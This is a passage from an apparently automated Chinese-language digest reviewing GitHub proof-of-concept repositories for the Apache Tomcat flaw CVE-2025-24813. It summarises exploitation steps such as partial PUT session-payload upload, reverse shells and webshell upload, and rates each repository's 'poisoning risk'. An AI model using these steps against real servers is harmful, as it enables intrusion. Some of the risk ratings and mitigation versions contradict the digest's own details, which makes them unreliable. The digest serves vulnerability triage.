总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
